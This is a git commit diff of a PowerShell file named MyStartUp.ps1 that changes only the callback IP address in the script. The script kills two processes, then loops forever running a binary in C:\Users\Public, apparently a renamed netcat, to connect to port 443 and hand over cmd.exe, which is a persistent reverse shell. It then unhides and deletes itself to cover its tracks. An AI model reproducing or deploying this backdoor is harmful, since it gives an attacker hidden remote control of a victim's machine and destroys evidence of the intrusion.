b8f2e481e90a14cb75d8d901bea6884287302116
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-02-19 22:34:57 +0100

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,6 +1,6 @@
 taskkill /F /IM testear.exe
 taskkill /F /IM lml.exe
 #C:\Users\seba\Downloads\lml.exe
-while ($true){C:\Users\Public\RNM.exe -nv 192.168.1.2 443 -e cmd.exe; sleep 4
+while ($true){C:\Users\Public\RNM.exe -nv 192.168.1.8 443 -e cmd.exe; sleep 4
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
